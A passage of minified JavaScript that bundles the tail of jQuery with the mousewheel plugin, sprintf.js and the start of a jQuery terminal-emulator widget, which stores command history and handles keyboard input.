return d.duration=K.fx.off?0:"number"==typeof d.duration?d.duration:d.duration in K.fx.speeds?K.fx.speeds[d.duration]:K.fx.speeds._default,(null==d.queue||d.queue===!0)&&(d.queue="fx"),d.old=d.complete,d.complete=function(a){K.isFunction(d.old)&&d.old.call(this),d.queue?K.dequeue(this,d.queue):a!==!1&&K._unmark(this)},d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),K.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(K.fx.step[this.prop]||K.fx.step._default)(this)},cur:function(){if(null!=this.elem[this.prop]&&(!this.elem.style||null==this.elem.style[this.prop]))return this.elem[this.prop];
var a,b=K.css(this.elem,this.prop);
return isNaN(a=parseFloat(b))?b&&"auto"!==b?b:0:a},custom:function(a,c,d){function e(a){return f.step(a)}var f=this,h=K.fx;
this.startTime=sb||g(),this.end=c,this.now=this.start=a,this.pos=this.state=0,this.unit=d||this.unit||(K.cssNumber[this.prop]?"":"px"),e.queue=this.options.queue,e.elem=this.elem,e.saveState=function(){f.options.hide&&K._data(f.elem,"fxshow"+f.prop)===b&&K._data(f.elem,"fxshow"+f.prop,f.start)},e()&&K.timers.push(e)&&!rb&&(rb=setInterval(h.tick,h.interval))},show:function(){var a=K._data(this.elem,"fxshow"+this.prop);
this.options.orig[this.prop]=a||K.style(this.elem,this.prop),this.options.show=!0,a!==b?this.custom(this.cur(),a):this.custom("width"===this.prop||"height"===this.prop?1:0,this.cur()),K(this.elem).show()},hide:function(){this.options.orig[this.prop]=K._data(this.elem,"fxshow"+this.prop)||K.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b,c,d,e=sb||g(),f=!0,h=this.elem,i=this.options;
if(a||e>=i.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),i.animatedProperties[this.prop]=!0;
for(b in i.animatedProperties)i.animatedProperties[b]!==!0&&(f=!1);
if(f){if(null!=i.overflow&&!K.support.shrinkWrapBlocks&&K.each(["","X","Y"],function(a,b){h.style["overflow"+b]=i.overflow[a]}),i.hide&&K(h).hide(),i.hide||i.show)for(b in i.animatedProperties)K.style(h,b,i.orig[b]),K.removeData(h,"fxshow"+b,!0),K.removeData(h,"toggle"+b,!0);
d=i.complete,d&&(i.complete=!1,d.call(h))}return!1}return i.duration==1/0?this.now=e:(c=e-this.startTime,this.state=c/i.duration,this.pos=K.easing[i.animatedProperties[this.prop]](this.state,c,0,1,i.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update(),!0}},K.extend(K.fx,{tick:function(){for(var a,b=K.timers,c=0;
c<b.length;
c++)a=b[c],!a()&&b[c]===a&&b.splice(c--,1);
b.length||K.fx.stop()},interval:13,stop:function(){clearInterval(rb),rb=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){K.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&null!=a.elem.style[a.prop]?a.elem.style[a.prop]=a.now+a.unit:a.elem[a.prop]=a.now}}}),K.each(["width","height"],function(a,b){K.fx.step[b]=function(a){K.style(a.elem,b,Math.max(0,a.now)+a.unit)}}),K.expr&&K.expr.filters&&(K.expr.filters.animated=function(a){return K.grep(K.timers,function(b){return a===b.elem}).length});
var xb=/^t(?:able|d|h)$/i,yb=/^(?:body|html)$/i;
"getBoundingClientRect"in H.documentElement?K.fn.offset=function(a){var b,d=this[0];
if(a)return this.each(function(b){K.offset.setOffset(this,a,b)});
if(!d||!d.ownerDocument)return null;
if(d===d.ownerDocument.body)return K.offset.bodyOffset(d);
try{b=d.getBoundingClientRect()}catch(e){}var f=d.ownerDocument,g=f.documentElement;
if(!b||!K.contains(g,d))return b?{top:b.top,left:b.left}:{top:0,left:0};
var h=f.body,i=c(f),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||K.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||K.support.boxModel&&g.scrollLeft||h.scrollLeft,n=b.top+l-j,o=b.left+m-k;
return{top:n,left:o}}:K.fn.offset=function(a){var b=this[0];
if(a)return this.each(function(b){K.offset.setOffset(this,a,b)});
if(!b||!b.ownerDocument)return null;
if(b===b.ownerDocument.body)return K.offset.bodyOffset(b);
for(var c,d=b.offsetParent,e=b,f=b.ownerDocument,g=f.documentElement,h=f.body,i=f.defaultView,j=i?i.getComputedStyle(b,null):b.currentStyle,k=b.offsetTop,l=b.offsetLeft;
(b=b.parentNode)&&b!==h&&b!==g&&(!K.support.fixedPosition||"fixed"!==j.position);
)c=i?i.getComputedStyle(b,null):b.currentStyle,k-=b.scrollTop,l-=b.scrollLeft,b===d&&(k+=b.offsetTop,l+=b.offsetLeft,K.support.doesNotAddBorder&&(!K.support.doesAddBorderForTableAndCells||!xb.test(b.nodeName))&&(k+=parseFloat(c.borderTopWidth)||0,l+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),K.support.subtractsBorderForOverflowNotVisible&&"visible"!==c.overflow&&(k+=parseFloat(c.borderTopWidth)||0,l+=parseFloat(c.borderLeftWidth)||0),j=c;
return("relative"===j.position||"static"===j.position)&&(k+=h.offsetTop,l+=h.offsetLeft),K.support.fixedPosition&&"fixed"===j.position&&(k+=Math.max(g.scrollTop,h.scrollTop),l+=Math.max(g.scrollLeft,h.scrollLeft)),{top:k,left:l}},K.offset={bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;
return K.support.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(K.css(a,"marginTop"))||0,c+=parseFloat(K.css(a,"marginLeft"))||0),{top:b,left:c}},setOffset:function(a,b,c){var d=K.css(a,"position");
"static"===d&&(a.style.position="relative");
var e,f,g=K(a),h=g.offset(),i=K.css(a,"top"),j=K.css(a,"left"),k=("absolute"===d||"fixed"===d)&&K.inArray("auto",[i,j])>-1,l={},m={};
k?(m=g.position(),e=m.top,f=m.left):(e=parseFloat(i)||0,f=parseFloat(j)||0),K.isFunction(b)&&(b=b.call(a,c,h)),null!=b.top&&(l.top=b.top-h.top+e),null!=b.left&&(l.left=b.left-h.left+f),"using"in b?b.using.call(a,l):g.css(l)}},K.fn.extend({position:function(){if(!this[0])return null;
var a=this[0],b=this.offsetParent(),c=this.offset(),d=yb.test(b[0].nodeName)?{top:0,left:0}:b.offset();
return c.top-=parseFloat(K.css(a,"marginTop"))||0,c.left-=parseFloat(K.css(a,"marginLeft"))||0,d.top+=parseFloat(K.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(K.css(b[0],"borderLeftWidth"))||0,{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){for(var a=this.offsetParent||H.body;
a&&!yb.test(a.nodeName)&&"static"===K.css(a,"position");
)a=a.offsetParent;
return a})}}),K.each(["Left","Top"],function(a,d){var e="scroll"+d;
K.fn[e]=function(d){var f,g;
return d===b?(f=this[0])?(g=c(f),g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:K.support.boxModel&&g.document.documentElement[e]||g.document.body[e]:f[e]):null:this.each(function(){g=c(this),g?g.scrollTo(a?K(g).scrollLeft():d,a?d:K(g).scrollTop()):this[e]=d})}}),K.each(["Height","Width"],function(a,c){var d=c.toLowerCase();
K.fn["inner"+c]=function(){var a=this[0];
return a?a.style?parseFloat(K.css(a,d,"padding")):this[d]():null},K.fn["outer"+c]=function(a){var b=this[0];
return b?b.style?parseFloat(K.css(b,d,a?"margin":"border")):this[d]():null},K.fn[d]=function(a){var e=this[0];
if(!e)return null==a?null:this;
if(K.isFunction(a))return this.each(function(b){var c=K(this);
c[d](a.call(this,b,c[d]()))});
if(K.isWindow(e)){var f=e.document.documentElement["client"+c],g=e.document.body;
return"CSS1Compat"===e.document.compatMode&&f||g&&g["client"+c]||f}if(9===e.nodeType)return Math.max(e.documentElement["client"+c],e.body["scroll"+c],e.documentElement["scroll"+c],e.body["offset"+c],e.documentElement["offset"+c]);
if(a===b){var h=K.css(e,d),i=parseFloat(h);
return K.isNumeric(i)?i:h}return this.css(d,"string"==typeof a?a:a+"px")}}),a.jQuery=a.$=K,"function"==typeof define&&define.amd&&define.amd.jQuery&&define("jquery",[],function(){return K})}(window),function(a){function b(b){var c=b||window.event,d=[].slice.call(arguments,1),e=0,f=0,g=0;
return b=a.event.fix(c),b.type="mousewheel",c.wheelDelta&&(e=c.wheelDelta/120),c.detail&&(e=-c.detail/3),g=e,void 0!==c.axis&&c.axis===c.HORIZONTAL_AXIS&&(g=0,f=-1*e),void 0!==c.wheelDeltaY&&(g=c.wheelDeltaY/120),void 0!==c.wheelDeltaX&&(f=-1*c.wheelDeltaX/120),d.unshift(b,e,f,g),(a.event.dispatch||a.event.handle).apply(this,d)}var c=["DOMMouseScroll","mousewheel"];
if(a.event.fixHooks)for(var d=c.length;
d;
)a.event.fixHooks[c[--d]]=a.event.mouseHooks;
a.event.special.mousewheel={setup:function(){if(this.addEventListener)for(var a=c.length;
a;
)this.addEventListener(c[--a],b,!1);
else this.onmousewheel=b},teardown:function(){if(this.removeEventListener)for(var a=c.length;
a;
)this.removeEventListener(c[--a],b,!1);
else this.onmousewheel=null}},a.fn.extend({mousewheel:function(a){return a?this.bind("mousewheel",a):this.trigger("mousewheel")},unmousewheel:function(a){return this.unbind("mousewheel",a)}})}(jQuery),function(a){function b(a){return Object.prototype.toString.call(a).slice(8,-1).toLowerCase()}function c(a,b){for(var c=[];
b>0;
c[--b]=a);
return c.join("")}var d=function(){return d.cache.hasOwnProperty(arguments[0])||(d.cache[arguments[0]]=d.parse(arguments[0])),d.format.call(null,d.cache[arguments[0]],arguments)};
d.format=function(a,e){var f,g,h,i,j,k,l,m=1,n=a.length,o="",p=[];
for(g=0;
n>g;
g++)if(o=b(a[g]),"string"===o)p.push(a[g]);
else if("array"===o){if(i=a[g],i[2])for(f=e[m],h=0;
h<i[2].length;
h++){if(!f.hasOwnProperty(i[2][h]))throw d('[sprintf] property "%s" does not exist',i[2][h]);
f=f[i[2][h]]}else f=i[1]?e[i[1]]:e[m++];
if(/[^s]/.test(i[8])&&"number"!=b(f))throw d("[sprintf] expecting number but found %s",b(f));
switch(i[8]){case"b":f=f.toString(2);
break;
case"c":f=String.fromCharCode(f);
break;
case"d":f=parseInt(f,10);
break;
case"e":f=i[7]?f.toExponential(i[7]):f.toExponential();
break;
case"f":f=i[7]?parseFloat(f).toFixed(i[7]):parseFloat(f);
break;
case"o":f=f.toString(8);
break;
case"s":f=(f=String(f))&&i[7]?f.substring(0,i[7]):f;
break;
case"u":f>>>=0;
break;
case"x":f=f.toString(16);
break;
case"X":f=f.toString(16).toUpperCase()}f=/[def]/.test(i[8])&&i[3]&&f>=0?"+"+f:f,k=i[4]?"0"==i[4]?"0":i[4].charAt(1):" ",l=i[6]-String(f).length,j=i[6]?c(k,l):"",p.push(i[5]?f+j:j+f)}return p.join("")},d.cache={},d.parse=function(a){for(var b=a,c=[],d=[],e=0;
b;
){if(null!==(c=/^[^\x25]+/.exec(b)))d.push(c[0]);
else if(null!==(c=/^\x25{2}/.exec(b)))d.push("%");
else{if(null===(c=/^\x25(?:([1-9]\d*)\$|\(([^\)]+)\))?(\+)?(0|'[^$])?(-)?(\d+)?(?:\.(\d+))?([b-fosuxX])/.exec(b)))throw"[sprintf] huh?";
if(c[2]){e|=1;
var f=[],g=c[2],h=[];
if(null===(h=/^([a-z_][a-z_\d]*)/i.exec(g)))throw"[sprintf] huh?";
for(f.push(h[1]);
""!==(g=g.substring(h[0].length));
)if(null!==(h=/^\.([a-z_][a-z_\d]*)/i.exec(g)))f.push(h[1]);
else{if(null===(h=/^\[(\d+)\]/.exec(g)))throw"[sprintf] huh?";

 f.push(h[1])}c[2]=f}else e|=2;
if(3===e)throw"[sprintf] mixing positional and named placeholders is not (yet) supported";
d.push(c)}b=b.substring(c[0].length)}return d};
var e=function(a,b,c){return c=b.slice(0),c.splice(0,0,a),d.apply(null,c)};
a.sprintf=d,a.vsprintf=e}("undefined"!=typeof global?global:window),function(a,b){"use strict";
function c(a,b){var c;
if("string"==typeof a&&"string"==typeof b)return localStorage[a]=b,!0;
if("object"==typeof a&&"undefined"==typeof b){for(c in a)a.hasOwnProperty(c)&&(localStorage[c]=a[c]);
return!0}return!1}function d(a,b){var c,d,e;
if(c=new Date,c.setTime(c.getTime()+31536e6),d=";
 expires="+c.toGMTString(),"string"==typeof a&&"string"==typeof b)return document.cookie=a+"="+b+d+";
 path=/",!0;
if("object"==typeof a&&"undefined"==typeof b){for(e in a)a.hasOwnProperty(e)&&(document.cookie=e+"="+a[e]+d+";
 path=/");
return!0}return!1}function e(a){return localStorage[a]}function f(a){var b,c,d,e;
for(b=a+"=",c=document.cookie.split(";
"),d=0;
d<c.length;
d++){for(e=c[d];
" "===e.charAt(0);
)e=e.substring(1,e.length);
if(0===e.indexOf(b))return e.substring(b.length,e.length)}return null}function g(a){return delete localStorage[a]}function h(a){return d(a,"",-1)}function i(a,b){var c=[],d=a.length;
if(b>d)return[a];
if(0>b)throw new Error("str_parts: length can't be negative");
for(var e=0;
d>e;
e+=b)c.push(a.substring(e,e+b));
return c}function j(b){var c=b?[b]:[],d=0;
a.extend(this,{get:function(){return c},rotate:function(){return c.filter(Boolean).length?1===c.length?c[0]:(d===c.length-1?d=0:++d,c[d]?c[d]:this.rotate()):void 0},length:function(){return c.length},remove:function(a){delete c[a]},set:function(a){for(var b=c.length;
b--;
)if(c[b]===a)return void(d=b);
this.append(a)},front:function(){if(c.length){for(var a=d,b=!1;
!c[a];
)if(a++,a>c.length){if(b)break;
a=0,b=!0}return c[a]}},append:function(a){c.push(a)}})}function k(b){var c=b instanceof Array?b:b?[b]:[];
a.extend(this,{data:function(){return c},map:function(b){return a.map(c,b)},size:function(){return c.length},pop:function(){if(0===c.length)return null;
var a=c[c.length-1];
return c=c.slice(0,c.length-1),a},push:function(a){return c=c.concat([a]),a},top:function(){return c.length>0?c[c.length-1]:null},clone:function(){return new k(c.slice(0))}})}function l(b,c){var d=!0,e="";
"string"==typeof b&&""!==b&&(e=b+"_"),e+="commands";
var f=a.Storage.get(e);
f=f?a.parseJSON(f):[];
var g=f.length-1;
a.extend(this,{append:function(b){d&&f[f.length-1]!==b&&(f.push(b),c&&f.length>c&&(f=f.slice(-c)),g=f.length-1,a.Storage.set(e,a.json_stringify(f)))},data:function(){return f},reset:function(){g=f.length-1},last:function(){return f[f.length-1]},end:function(){return g===f.length-1},position:function(){return g},current:function(){return f[g]},next:function(){return g<f.length-1&&++g,-1!==g?f[g]:void 0},previous:function(){var a=g;
return g>0&&--g,-1!==a?f[g]:void 0},clear:function(){f=[],this.purge()},enabled:function(){return d},enable:function(){d=!0},purge:function(){a.Storage.remove(e)},disable:function(){d=!1}})}function m(b){return a("<div>"+a.terminal.strip(b)+"</div>").text().length}function n(b,c){var d=c(b);
if(d.length){var e=d.shift(),f=new RegExp("^"+a.terminal.escape_regex(e)),g=b.replace(f,"").trim();
return{command:b,name:e,args:d,rest:g}}return{command:b,name:"",args:[],rest:""}}function o(){var b=a('<div class="terminal temp"><div class="cmd"><span class="cursor">&nbsp;
</span></div></div>').appendTo("body"),c=b.find("span"),d={width:c.width(),height:c.outerHeight()};
return b.remove(),d}function p(b){var c=a('<div class="terminal wrap"><span class="cursor">&nbsp;
</span></div>').appendTo("body").css("padding",0),d=c.find("span"),e=d[0].getBoundingClientRect().width,f=Math.floor(b.width()/e);
if(c.remove(),s(b)){var g=20,h=b.innerWidth()-b.width();
f-=Math.ceil((g-h/2)/(e-1))}return f}function q(a){return Math.floor(a.height()/o().height)}function r(){if(window.getSelection||document.getSelection){var a=(window.getSelection||document.getSelection)();
return a.text?a.text:a.toString()}return document.selection?document.selection.createRange().text:void 0}function s(b){return"scroll"==b.css("overflow")||"scroll"==b.css("overflow-y")?!0:b.is("body")?a("body").height()>a(window).height():b.get(0).scrollHeight>b.innerHeight()}a.omap=function(b,c){var d={};
return a.each(b,function(a,e){d[a]=c.call(b,a,e)}),d};
var t={clone_object:function(b){var c={};
if("object"==typeof b){if(a.isArray(b))return this.clone_array(b);
if(null===b)return b;
for(var d in b)a.isArray(b[d])?c[d]=this.clone_array(b[d]):"object"==typeof b[d]?c[d]=this.clone_object(b[d]):c[d]=b[d]}return c},clone_array:function(b){if(!a.isFunction(Array.prototype.map))throw new Error("You'r browser don't support ES5 array map use es5-shim");
return b.slice(0).map(function(a){return"object"==typeof a?this.clone_object(a):a}.bind(this))}},u=function(a){return t.clone_object(a)},v=function(){var a="test",b=window.localStorage;
try{return b.setItem(a,"1"),b.removeItem(a),!0}catch(c){return!1}},w=v();
a.extend({Storage:{set:w?c:d,get:w?e:f,remove:w?g:h}});
var x=a;
x.fn.extend({everyTime:function(a,b,c,d,e){return this.each(function(){x.timer.add(this,a,b,c,d,e)})},oneTime:function(a,b,c){return this.each(function(){x.timer.add(this,a,b,c,1)})},stopTime:function(a,b){return this.each(function(){x.timer.remove(this,a,b)})}}),x.extend({timer:{guid:1,global:{},regex:/^([0-9]+)\s*(.*s)?$/,powers:{ms:1,cs:10,ds:100,s:1e3,das:1e4,hs:1e5,ks:1e6},timeParse:function(a){if(a===b||null===a)return null;
var c=this.regex.exec(x.trim(a.toString()));
if(c[2]){var d=parseInt(c[1],10),e=this.powers[c[2]]||1;
return d*e}return a},add:function(a,b,c,d,e,f){var g=0;
if(x.isFunction(c)&&(e||(e=d),d=c,c=b),b=x.timer.timeParse(b),!("number"!=typeof b||isNaN(b)||0>=b)){e&&e.constructor!==Number&&(f=!!e,e=0),e=e||0,f=f||!1,a.$timers||(a.$timers={}),a.$timers[c]||(a.$timers[c]={}),d.$timerID=d.$timerID||this.guid++;
var h=function(){f&&h.inProgress||(h.inProgress=!0,(++g>e&&0!==e||d.call(a,g)===!1)&&x.timer.remove(a,c,d),h.inProgress=!1)};
h.$timerID=d.$timerID,a.$timers[c][d.$timerID]||(a.$timers[c][d.$timerID]=window.setInterval(h,b)),this.global[c]||(this.global[c]=[]),this.global[c].push(a)}},remove:function(a,b,c){var d,e=a.$timers;
if(e){if(b){if(e[b]){if(c)c.$timerID&&(window.clearInterval(e[b][c.$timerID]),delete e[b][c.$timerID]);
else for(var f in e[b])e[b].hasOwnProperty(f)&&(window.clearInterval(e[b][f]),delete e[b][f]);
for(d in e[b])if(e[b].hasOwnProperty(d))break;
d||(d=null,delete e[b])}}else for(var g in e)e.hasOwnProperty(g)&&this.remove(a,g,c);
for(d in e)if(e.hasOwnProperty(d))break;
d||(a.$timers=null)}}}}),/(msie) ([\w.]+)/.exec(navigator.userAgent.toLowerCase())&&x(window).one("unload",function(){var a=x.timer.global;
for(var b in a)if(a.hasOwnProperty(b))for(var c=a[b],d=c.length;
--d;
)x.timer.remove(c[d],b)}),function(a){if(String.prototype.split.toString().match(/\[native/)){var b,c=String.prototype.split,d=/()??/.exec("")[1]===a;
return b=function(b,e,f){if("[object RegExp]"!==Object.prototype.toString.call(e))return c.call(b,e,f);
var g,h,i,j,k=[],l=(e.ignoreCase?"i":"")+(e.multiline?"m":"")+(e.extended?"x":"")+(e.sticky?"y":""),m=0;
for(e=new RegExp(e.source,l+"g"),b+="",d||(g=new RegExp("^"+e.source+"$(?!\\s)",l)),f=f===a?-1>>>0:f>>>0;
(h=e.exec(b))&&(i=h.index+h[0].length,!(i>m&&(k.push(b.slice(m,h.index)),!d&&h.length>1&&h[0].replace(g,function(){for(var b=1;
b<arguments.length-2;
b++)arguments[b]===a&&(h[b]=a)}),h.length>1&&h.index<b.length&&Array.prototype.push.apply(k,h.slice(1)),j=h[0].length,m=i,k.length>=f)));
)e.lastIndex===h.index&&e.lastIndex++;
return m===b.length?(j||!e.test(""))&&k.push(""):k.push(b.slice(m)),k.length>f?k.slice(0,f):k},String.prototype.split=function(a,c){return b(this,a,c)},b}}(),a.fn.caret=function(a){var b=this[0],c="true"===b.contentEditable;
if(0==arguments.length){if(window.getSelection){if(c){b.focus();
var d=window.getSelection().getRangeAt(0),e=d.cloneRange();
return e.selectNodeContents(b),e.setEnd(d.endContainer,d.endOffset),e.toString().length}return b.selectionStart}if(document.selection){if(b.focus(),c){var d=document.selection.createRange(),e=document.body.createTextRange();
return e.moveToElementText(b),e.setEndPoint("EndToEnd",d),e.text.length}var a=0,f=b.createTextRange(),e=document.selection.createRange().duplicate(),g=e.getBookmark();
for(f.moveToBookmark(g);
0!==f.moveStart("character",-1);
)a++;
return a}return 0}if(-1==a&&(a=this[c?"text":"val"]().length),window.getSelection)c?(b.focus(),window.getSelection().collapse(b.firstChild,a)):b.setSelectionRange(a,a);
else if(document.body.createTextRange){var f=document.body.createTextRange();
f.moveToElementText(b),f.moveStart("character",a),f.collapse(!0),f.select()}return c||b.focus(),a},a.json_stringify=function(c,d){var e,f="";
d=d===b?1:d;
var g=typeof c;
switch(g){case"function":f+=c;
break;
case"boolean":f+=c?"true":"false";
break;
case"object":if(null===c)f+="null";
else if(c instanceof Array){f+="[";
var h=c.length;
for(e=0;
h-1>e;
++e)f+=a.json_stringify(c[e],d+1);
f+=a.json_stringify(c[h-1],d+1)+"]"}else{f+="{";
for(var i in c)c.hasOwnProperty(i)&&(f+='"'+i+'":'+a.json_stringify(c[i],d+1));
f+="}"}break;
case"string":var j=c,k={"\\\\":"\\\\",'"':'\\"',"/":"\\/","\\n":"\\n","\\r":"\\r","\\t":"\\t"};
for(e in k)k.hasOwnProperty(e)&&(j=j.replace(new RegExp(e,"g"),k[e]));
f+='"'+j+'"';
break;
case"number":f+=String(c)}return f+=d>1?",":"",1===d&&(f=f.replace(/,([\]}])/g,"$1")),f.replace(/([\[{]),/g,"$1")};
var y=function(){var a=document.createElement("div");
return a.setAttribute("onpaste","return;
"),"function"==typeof a.onpaste}();
a.fn.cmd=function(c){function d(){var a=v.is(":focus");
F?a||(v.focus(),t.oneTime(10,function(){v.focus()})):a&&v.blur()}function e(){B&&t.oneTime(10,function(){v.val(O),t.oneTime(10,function(){v.caret(R)})})}function f(a){T.toggleClass("inverted")}function g(){E="(reverse-i-search)`"+L+"': ",Y()}function h(){E=C,K=!1,M=null,L=""}function j(b){var c,d,e=H.data(),f=e.length;
if(b&&M>0&&(f-=M),L.length>0)for(var h=L.length;
h>0;
h--){d=a.terminal.escape_regex(L.substring(0,h)),c=new RegExp(d);
for(var i=f;
i--;
)if(c.test(e[i]))return M=e.length-i,t.position(e[i].indexOf(d)),t.set(e[i],!0),X(),void(L.length!==h&&(L=L.substring(0,h),g()))}L=""}function k(){var a=t.width(),b=T[0].getBoundingClientRect().width;
w=Math.floor(a/b)}function m(a){var b=a.substring(0,w-x),c=a.substring(w-x);
return[b].concat(i(c,w))}function n(a){if(!(U++>0)&&(a.originalEvent&&(a=a.originalEvent),t.isenabled())){var b=t.find("textarea");
b.is(":focus")||b.focus(),t.oneTime(100,function(){t.insert(b.val()),b.val(""),e()})}}function o(d){var e,f,i;
if(F){if(a.isFunction(c.keydown)&&(e=c.keydown(d),e!==b))return e;
if(38===d.which||80===d.which&&d.ctrlKey||(Z=!0),!K||35!==d.which&&36!==d.which&&37!==d.which&&38!==d.which&&39!==d.which&&40!==d.which&&13!==d.which&&27!==d.which){if(d.altKey)return 68===d.which?(t.set(O.slice(0,R)+O.slice(R).replace(/ *[^ ]+ *(?= )|[^ ]+$/,""),!0),!1):!0;
if(13===d.keyCode)if(d.shiftKey)t.insert("\n");
else{(H&&O&&!N&&a.isFunction(c.historyFilter)&&c.historyFilter(O)||c.historyFilter instanceof RegExp&&O.match(c.historyFilter)||!c.historyFilter)&&H.append(O);
var k=O;
H.reset(),t.set(""),c.commands&&c.commands(k),a.isFunction(E)&&Y()}else if(8===d.which){if(K?(L=L.slice(0,-1),g()):""!==O&&R>0&&t["delete"](-1),B)return!0}else if(67===d.which&&d.ctrlKey&&d.shiftKey)P=r();
else if(86===d.which&&d.ctrlKey&&d.shiftKey)""!==P&&t.insert(P);
else if(9!==d.which||d.ctrlKey||d.altKey){if(46===d.which)return void t["delete"](1);
if(H&&38===d.which&&!d.ctrlKey||80===d.which&&d.ctrlKey)Z?(D=O,t.set(H.current())):t.set(H.previous()),Z=!1;
else if(H&&40===d.which&&!d.ctrlKey||78===d.which&&d.ctrlKey)t.set(H.end()?D:H.next());
else if(37===d.which||66===d.which&&d.ctrlKey)if(d.ctrlKey&&66!==d.which){i=R-1,f=0," "===O[i]&&--i;
for(var l=i;
l>0;
--l){if(" "===O[l]&&" "!==O[l+1]){f=l+1;
break}if("\n"===O[l]&&"\n"!==O[l+1]){f=l;
break}}t.position(f)}else R>0&&(t.position(-1,!0),X());
else if(82===d.which&&d.ctrlKey)K?j(!0):(C=E,g(),D=O,t.set(""),X(),K=!0);
else if(71==d.which&&d.ctrlKey)K&&(E=C,Y(),t.set(D),X(),K=!1,L="");
else if(39===d.which||70===d.which&&d.ctrlKey)if(d.ctrlKey&&70!==d.which){" "===O[R]&&++R;
var m=/\S[\n\s]{2,}|[\n\s]+\S?/,p=O.slice(R).match(m);
!p||p[0].match(/^\s+$/)?t.position(O.length):" "!==p[0][0]?R+=p.index+1:(R+=p.index+p[0].length-1," "!==p[0][p[0].length-1]&&--R),X()}else R<O.length&&t.position(1,!0);
else{if(123===d.which)return;
if(36===d.which)t.position(0);
else if(35===d.which)t.position(O.length);
else{if(d.shiftKey&&45==d.which)return v.val(""),U=0,void(y?v.focus():n(d));
if(!d.ctrlKey&&!d.metaKey)return $=!1,void(W=!0);
if(192===d.which)return;
if(d.metaKey){if(82===d.which)return;
if(76===d.which)return}if(d.shiftKey){if(84===d.which)return}else{if(81===d.which){if(""!==O&&0!==R){var q=O.slice(0,R).match(/([^ ]+ *$)/);
Q=t["delete"](-q[0].length)}return!1}if(72===d.which)return""!==O&&R>0&&t["delete"](-1),!1;
if(65===d.which)t.position(0);
else if(69===d.which)t.position(O.length);
else{if(88===d.which||67===d.which||84===d.which)return;
if(89===d.which)""!==Q&&t.insert(Q);
else{if(86===d.which||118===d.which)return v.val(""),U=0,void(y?(v.focus(),v.on("input",function s(a){n(a),v.off("input",s)})):n(d));
if(75===d.which)Q=t["delete"](O.length-R);
else if(85===d.which)""!==O&&0!==R&&(Q=t["delete"](-R));
else if(17===d.which)return!1}}}}}}else t.insert(" ")}else h(),Y(),27===d.which&&t.set(""),X(),o.call(this,d);
d.preventDefault()}}function p(){a.isFunction(c.onCommandChange)&&c.onCommandChange(O)}function q(d){var e;
if(W=!1,(!d.ctrlKey&&!d.metaKey||-1===[99,118,86].indexOf(d.which))&&!$){if(!K&&a.isFunction(c.keypress)&&(e=c.keypress(d)),e!==b&&!e)return e;
if(F){if(a.inArray(d.which,[38,13,0,8])>-1&&(38!==d.which||!d.shiftKey)){if(123==d.keyCode)return;
return!1}if(!d.ctrlKey&&(!d.altKey||100!==d.which)||d.altKey)return K?(L+=String.fromCharCode(d.which),j(),g()):t.insert(String.fromCharCode(d.which)),!1}}}function s(a){if(W){var b=v.val();
(b||8==a.which)&&t.set(b)}}var t=this,u=t.data("cmd");
if(u)return u;
t.addClass("cmd"),t.append('<span class="prompt"></span><span></span><span class="cursor">&nbsp;
</span><span></span>');
var v=a("<textarea>").addClass("clipboard").appendTo(t);
c.width&&t.width(c.width);
var w,x,C,D,E,F,G,H,I,J=t.find(".prompt"),K=!1,L="",M=null,N=c.mask||!1,O="",P="",Q="",R=0,S=c.historySize||60,T=t.find(".cursor"),U=0;
if(z&&!A)I=function(a){a?T.addClass("blink"):T.removeClass("blink")};
else{var V=!1;
I=function(a){a&&!V?(V=!0,T.addClass("inverted blink"),t.everyTime(500,"blink",f)):V&&!a&&(V=!1,t.stopTime("blink",f),T.removeClass("inverted blink"))}}var W,X=function(b){function c(b,c){var d=b.length;
if(c===d)g.html(a.terminal.encode(b)),T.html("&nbsp;
"),h.html("");
else if(0===c)g.html(""),T.html(a.terminal.encode(b.slice(0,1))),h.html(a.terminal.encode(b.slice(1)));
else{var e=b.slice(0,c);
g.html(a.terminal.encode(e));
var f=b.slice(c,c+1);
T.html(a.terminal.encode(f)),c===b.length-1?h.html(""):h.html(a.terminal.encode(b.slice(c+1)))}}function d(b){return"<div>"+a.terminal.encode(b)+"</div>"}function e(b){var c=h;
a.each(b,function(b,e){c=a(d(e)).insertAfter(c).addClass("clear")})}function f(b){a.each(b,function(a,b){g.before(d(b))})}var g=T.prev(),h=T.next();
return function(){var j,k;
switch(typeof N){case"boolean":j=N?O.replace(/./g,"*"):O;
break;
case"string":j=O.replace(/./g,N)}var l,n;
if(b.find("div").remove(),g.html(""),j.length>w-x-1||j.match(/\n/)){var o,p=j.match(/\t/g),q=p?3*p.length:0;
if(p&&(j=j.replace(/\t/g,"\x00\x00\x00\x00")),j.match(/\n/)){var r=j.split("\n");
for(n=w-x-1,l=0;
l<r.length-1;
++l)r[l]+=" ";
for(r[0].length>n?(o=[r[0].substring(0,n)],k=r[0].substring(n),o=o.concat(i(k,w))):o=[r[0]],l=1;
l<r.length;
++l)r[l].length>w?o=o.concat(i(r[l],w)):o.push(r[l])}else o=m(j);
if(p&&(o=a.map(o,function(a){return a.replace(/\x00\x00\x00\x00/g," ")})),n=o[0].length,0===n&&1===o.length);
else if(n>R)c(o[0],R),e(o.slice(1));
else if(R===n)g.before(d(o[0])),c(o[1],0),e(o.slice(2));
else{var s=o.length;
if(n>R)c(o[0],R),e(o.slice(1));
else if(R===n)g.before(d(o[0])),c(o[1],0),e(o.slice(2));
else{var t=o.slice(-1)[0],u=j.length-R-q,v=t.length,y=0;
if(v>=u)f(o.slice(0,-1)),y=v===u?0:v-u,c(t,y);
